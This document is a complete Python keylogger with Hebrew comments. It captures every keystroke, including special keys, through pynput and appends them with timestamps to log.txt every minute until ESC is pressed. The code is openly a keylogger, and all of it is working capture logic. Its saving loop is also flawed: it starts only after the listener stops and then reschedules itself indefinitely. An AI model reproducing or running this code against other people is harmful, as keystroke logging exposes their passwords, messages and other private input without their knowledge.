from pynput import keyboard
from typing import List
import time
import threading

class KeyLoggerService:
    def __init__(self):
        self.logged_keys: List[str] = []
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)

    def on_press(self, key):
        """פונקציה שמופעלת בכל פעם שנלחץ מקש"""
        try:
            self.logged_keys.append(str(key.char))  # אותיות רגילות, כולל עברית
        except AttributeError:
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.backspace: "BACKSPACE",
                keyboard.Key.shift: "SHIFT",
                keyboard.Key.ctrl_l: "CTRL_L",
                keyboard.Key.ctrl_r: "CTRL_R",
                keyboard.Key.alt_l: "ALT_L",
                keyboard.Key.alt_r: "ALT_R",
                keyboard.Key.tab: "TAB",
                keyboard.Key.esc: "ESCAPE"
            }
            self.logged_keys.append(special_keys.get(key, str(key)))  # תרגום מקשים מיוחדים

    def on_release(self, key):
        """עוצר את ההאזנה אם המשתמש לוחץ על ESC"""
        if key == keyboard.Key.esc:
            return False  # מפסיק את ההאזנה

    def start_logging(self):
        """מתחיל להאזין להקלדות"""
        self.listener.start()
        self.listener.join()

    def stop_logging(self):
        """עוצר את ההאזנה להקלדות"""
        self.listener.stop()

    def get_logged_keys(self) -> List[str]:
        """מחזיר את רשימת ההקלדות שנאספו"""
        return self.logged_keys

class FileWriter:
    def __init__(self, filename="log.txt"):
        self.filename = filename

    def write_to_file(self, data: List[str]):
        """כותב את הנתונים לקובץ עם חותמת זמן"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        with open(self.filename, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] " + " ".join(data) + "\n")

class KeyLoggerManager:
    def __init__(self):
        self.logger = KeyLoggerService()
        self.writer = FileWriter()
        self.running = False

    def start(self):
        """מתחיל את תהליך איסוף ההקלדות ושמירתן כל דקה"""
        self.running = True
        self.logger.start_logging()
        self._schedule_saving()

    def stop(self):
        """עוצר את ההקלטה ושומר את הנתונים שנותרו"""
        self.running = False
        self.logger.stop_logging()
        self._save_to_file()

    def _schedule_saving(self):
        """מתזמן את שמירת הנתונים כל 60 שניות"""
        if self.running:
            self._save_to_file()
            threading.Timer(60, self._schedule_saving).start()

    def _save_to_file(self):
        """שומר את הנתונים לקובץ ומנקה את הזיכרון"""
        data = self.logger.get_logged_keys()
        if data:
            self.writer.write_to_file(data)
            self.logger.logged_keys.clear()  # מנקה את ה-Buffer

# בדיקה
if __name__ == "__main__":
    manager = KeyLoggerManager()
    manager.start()
    print("Keylogger פועל... לחץ על ESC כדי לעצור")
